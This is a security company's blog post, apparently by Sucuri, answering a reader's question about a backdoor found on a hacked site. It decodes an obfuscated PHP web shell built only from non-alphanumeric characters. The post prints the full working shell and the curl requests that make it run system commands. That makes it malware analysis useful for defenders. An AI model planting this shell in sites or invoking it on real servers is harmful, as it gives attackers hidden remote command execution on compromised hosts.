@@ -1,0 +1,49 @@
+Ask Sucuri: Non-Alphanumeric Backdoors
+
+If you have any questions about malware, blacklisting, or security in general, send them to contact@sucuri.net and we will write a post about it and share. For all the “Ask Sucuri” answers, go here.
+
+Question: My site got hacked and I am seeing this backdoor with no alpha numeric characters. What is it doing?
+@$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((++$__)+($__++ ))].=$_;
+$_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__];
+$_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
+$_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
+$_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ];
+$_=$
+$_[$__+ $__] ;$_[@-_]($_[@!+_] );
+
+Answer: Backdoors are tools used by attackers to help them maintain access to the sites they compromise. The harder it is to find the backdoor, the better for the attackers, since it will likely remain undetected allowing them to reinfect or regain access to the site whenever they want.
+This backdoor is a very good example of a sneaky one. No alpha numeric characters, no direct function calls or anything like that. So what is it doing? We asked one of our developers, Yorman Arias, to help decode it.
+
+Non-Alphanumeric PHP-Shell
+This is an interesting PHP-Shell with non-alphanumeric characters, it is created with an array of data concatenated to be able to execute any PHP function with one optional argument that can be passed through a GET request.
+
+Since it is very hard to read, we divided it into parts by adding a new line after each semicolon:
+
+As you can see, we wrote some var_dump sentences after each line involved with a mathematical and functional operation.
+To decode it in more detail, we executed it without hesitation because there wasn’t an operation with direct contact with the filesystem. In the process we got these two warnings (shell.php is the filename we chose to work with):
+PHP Notice:  Undefined offset: 0 in /shell.php on line 16
+PHP Fatal error:  Function name must be a string in /shell.php on line 17
+
+We assumed that the shell was waiting for an argument in offset 0 to be a valid PHP function name using this code: $_[0]. The last sentence was obviously the execution of that method, so we used the common function system() and sent a GET request to the shell like this:
+$ curl 'httx:// 127.0.0.1:9999/shell  .php?0=system'
+
+But didn’t get a response, so we checked the server logs to find this:
+PHP Warning:  system(): Cannot execute a blank command in /shell.php on line 17
+
+The PHP function system() was waiting for an argument with a valid command to be executed on the server, but it wasn’t in the code so it should be passed as another parameter in the request, and finally got this:
+$ curl 'httx://127.0.0.1:9999/ shell .php?0=system &1=uname  %20-a'
+Linux linux 3.7-trunk-amd64 #1 SMP Debian 3.7.2-0+kali8 x86_64 GNU/Linux
+
+Technical Explanation
+Step #1
+The PHP Shell started with this code: @$_[]=@!+_; an array initialization with a curious value. PHP will try to parse the underscore present in the value of that variable as a constant, and when the interpreter is unable to find the constant, it will prompt us with a notice. The creator of this shell suppressed the notice warning using the @ symbol.
+The missing constant in turn will be converted to a string: string(1) ‘_’ and this one was casted to an integer using the plus-operator to get this: int(0)
+Finally, appending the exclamation-mark, the value zero will be casted to a boolean bool(true). So, at the last we have a first line of code decoded being interpreted as an array with a single boolean value: array(true)
+Step #2
+The programmer tries to store it by pushing the value into the array $_, however it doesn’t exist, so he suppressed that too. PHP will automagically create it, and the value will get stored.
+Normally, when we try to access an array as a string in PHP, it will generate a string with value Array. If we have a string, we can generate other strings out of it by (ab)using AND, OR and XOR.
+It seems the programmer figured that he had a few characters that could easily generate in PHP, so he generated the characters to create the word GET, and by utilizing some boolean magic and variable dereferencing, he ended up with a PHP Shell with no functions, no strings and no numbers.
+Update 1: You can also found an older analysis of this backdoor here: http://blog.omfgitsasalmon.com/. What is also interesting is that according to some comments, this backdoor was created in early 2011 and only now is being used in the wild by attackers.
+Conclusion
+What more is there to say.. 🙂
+If you guys have any questions about this backdoor (or have any others you’d like us to breakdown), let us know.
